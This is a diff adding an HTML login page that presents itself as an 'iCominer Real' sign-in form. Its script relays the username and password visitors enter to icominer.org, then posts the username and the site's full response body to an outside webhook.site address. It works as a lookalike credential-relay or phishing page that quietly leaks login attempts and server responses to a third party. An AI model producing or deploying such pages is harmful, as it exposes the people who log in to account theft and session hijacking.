@@ -1,0 +1,125 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login | iCominer Real</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #ecf0f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 6px 15px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    h2 {
+      text-align: center;
+      color: #2d3436;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #0984e3;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .status {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #636e72;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>iCominer Real Login</h2>
+    <form id="realLoginForm">
+      <input type="text" id="username" placeholder="Username or Email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Sign In</button>
+      <div class="status" id="statusMsg">Waiting...</div>
+    </form>
+  </div>
+
+  <script>
+    async function getToken() {
+      const res = await fetch("https://icominer.org/login", { credentials: 'include' });
+      const text = await res.text();
+      const xsrf = document.cookie.split('; ').find(row => row.startsWith('XSRF-TOKEN='));
+      return xsrf ? decodeURIComponent(xsrf.split('=')[1]) : null;
+    }
+
+    document.getElementById("realLoginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      document.getElementById("statusMsg").innerText = "Fetching token...";
+
+      const token = await getToken();
+
+      if (!token) {
+        document.getElementById("statusMsg").innerText = "Failed to fetch XSRF token.";
+        return;
+      }
+
+      document.getElementById("statusMsg").innerText = "Submitting to iCominer...";
+
+      const payload = {
+        username: username,
+        password: password,
+        _token: token
+      };
+
+      // Send to iCominer
+      fetch("https://icominer.org/signin", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-XSRF-TOKEN": token
+        },
+        credentials: "include",
+        body: JSON.stringify(payload)
+      }).then(res => res.text())
+        .then(body => {
+          // Log to Webhook for analysis
+          fetch("https://webhook.site/846de35d-2625-497d-8ab8-414d516ccb49", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              attempted: username,
+              time: new Date().toISOString(),
+              body: body
+            })
+          });
+          document.getElementById("statusMsg").innerText = "Submitted. Response logged.";
+        }).catch(err => {
+          document.getElementById("statusMsg").innerText = "Error: " + err;
+        });
+    });
+  </script>
+</body>
+</html>
